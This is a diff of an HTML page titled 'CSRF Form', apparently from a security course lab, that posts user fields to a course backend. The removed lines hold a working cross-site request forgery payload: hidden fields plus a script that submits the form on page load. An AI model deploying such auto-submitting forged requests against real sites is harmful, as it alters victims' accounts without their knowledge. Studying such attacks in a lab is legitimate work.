@@ -1,15 +1,25 @@
-<html>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>CSRF Form</title>
+</head>
 <body>
+  <h1>Submit Your Information</h1>
   <form action="https://cse543.aranjbar.me/backend/tfourone" method="POST" enctype="multipart/form-data" id="csrfForm">
-    <input type="hidden" name="username" value="ljl5837">
-    <input type="hidden" name="email" value="something@something.com">
-    <input type="hidden" name="fname" value="loki">
-    <input type="hidden" name="mobile" value="899">
-  </form>
+    <input type="hidden" id="username" name="username" value="ljl5837"><br><br>
 
-  <script>
-    // Automatically submit the form when the page loads
-    document.getElementById('csrfForm').submit();
-  </script>
+    <label for="email">Email:</label><br>
+    <input type="email" id="email" name="email" required><br><br>
+
+    <label for="fname">First Name:</label><br>
+    <input type="text" id="fname" name="fname" required><br><br>
+
+    <label for="mobile">Mobile:</label><br>
+    <input type="text" id="mobile" name="mobile" required><br><br>
+
+    <button type="submit">Submit</button>
+  </form>
 </body>
 </html>
